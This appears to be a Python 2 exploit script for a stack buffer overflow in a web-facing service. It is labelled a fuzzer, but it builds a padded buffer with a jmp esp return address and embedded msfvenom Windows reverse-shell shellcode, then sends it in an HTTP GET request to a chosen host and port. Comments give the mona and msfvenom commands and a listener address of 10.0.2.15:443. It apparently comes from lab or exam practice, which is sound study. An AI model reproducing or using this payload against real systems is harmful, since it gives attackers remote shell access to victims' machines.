#!/usr/bin/python

import argparse
import sys
import socket
import struct

parser = argparse.ArgumentParser("Simple fuzzer for buffer overflow exploits")

parser.add_argument(action='store', dest='rhost', type=str, help='remote host')
parser.add_argument(action='store', type=int, dest='rport', help='remote port')

ap = parser.parse_args()
print("Sending exploit to " + ap.rhost + " " + str(ap.rport))

offset_srp = 1787
ptr_jmp_esp = 0x7e429353
nops = "\x83\xec\x10"
# nops = "\x90" * 18
buf_len = 2250

# badchars = [0x00, 0x0A, 0x0D]
# mona jmp -r esp -cpb "\0x00\0x0A\0x0D"
# # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -f python -b "\x00\x0A\x0D" -v shell EXITFUNC=thread

shell = ""
shell += "\xda\xd3\xba\xba\xf7\x61\x48\xd9\x74\x24\xf4\x58\x31"
shell += "\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\xea\xe4\x83"
shell += "\xbd\xf6\xe3\xc6\x3e\x06\xf4\xa6\xb7\xe3\xc5\xe6\xac"
shell += "\x60\x75\xd7\xa7\x24\x7a\x9c\xea\xdc\x09\xd0\x22\xd3"
shell += "\xba\x5f\x15\xda\x3b\xf3\x65\x7d\xb8\x0e\xba\x5d\x81"
shell += "\xc0\xcf\x9c\xc6\x3d\x3d\xcc\x9f\x4a\x90\xe0\x94\x07"
shell += "\x29\x8b\xe7\x86\x29\x68\xbf\xa9\x18\x3f\xcb\xf3\xba"
shell += "\xbe\x18\x88\xf2\xd8\x7d\xb5\x4d\x53\xb5\x41\x4c\xb5"
shell += "\x87\xaa\xe3\xf8\x27\x59\xfd\x3d\x8f\x82\x88\x37\xf3"
shell += "\x3f\x8b\x8c\x89\x9b\x1e\x16\x29\x6f\xb8\xf2\xcb\xbc"
shell += "\x5f\x71\xc7\x09\x2b\xdd\xc4\x8c\xf8\x56\xf0\x05\xff"
shell += "\xb8\x70\x5d\x24\x1c\xd8\x05\x45\x05\x84\xe8\x7a\x55"
shell += "\x67\x54\xdf\x1e\x8a\x81\x52\x7d\xc3\x66\x5f\x7d\x13"
shell += "\xe1\xe8\x0e\x21\xae\x42\x98\x09\x27\x4d\x5f\x6d\x12"
shell += "\x29\xcf\x90\x9d\x4a\xc6\x56\xc9\x1a\x70\x7e\x72\xf1"
shell += "\x80\x7f\xa7\x56\xd0\x2f\x18\x17\x80\x8f\xc8\xff\xca"
shell += "\x1f\x36\x1f\xf5\xf5\x5f\x8a\x0c\x9e\x55\x4b\x0c\x51"
shell += "\x02\x49\x10\x6c\x69\xc4\xf6\x04\x9d\x81\xa1\xb0\x04"
shell += "\x88\x39\x20\xc8\x06\x44\x62\x42\xa5\xb9\x2d\xa3\xc0"
shell += "\xa9\xda\x43\x9f\x93\x4d\x5b\x35\xbb\x12\xce\xd2\x3b"
shell += "\x5c\xf3\x4c\x6c\x09\xc5\x84\xf8\xa7\x7c\x3f\x1e\x3a"
shell += "\x18\x78\x9a\xe1\xd9\x87\x23\x67\x65\xac\x33\xb1\x66"
shell += "\xe8\x67\x6d\x31\xa6\xd1\xcb\xeb\x08\x8b\x85\x40\xc3"
shell += "\x5b\x53\xab\xd4\x1d\x5c\xe6\xa2\xc1\xed\x5f\xf3\xfe"
shell += "\xc2\x37\xf3\x87\x3e\xa8\xfc\x52\xfb\xc8\x1e\x76\xf6"
shell += "\x60\x87\x13\xbb\xec\x38\xce\xf8\x08\xbb\xfa\x80\xee"
shell += "\xa3\x8f\x85\xab\x63\x7c\xf4\xa4\x01\x82\xab\xc5\x03"

buf = ''
buf += '\x41' * offset_srp
buf += struct.pack("<I", ptr_jmp_esp)
buf += nops
buf += shell
buf += '\x43' * (buf_len - len(buf))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((ap.rhost, ap.rport))
    s.send("GET " + buf + " HTTP/1.0\r\n\r\n")
    data = s.recv(1024)
    print("Sent buffer length " + str(len(buf)))
    s.close()
except Exception:
    print("[+] exploit sent")
    sys.exit()
